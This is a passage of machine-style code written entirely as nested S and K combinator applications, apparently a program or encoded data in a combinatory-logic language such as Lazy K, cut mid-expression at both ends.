)(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((S)(K))(K))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)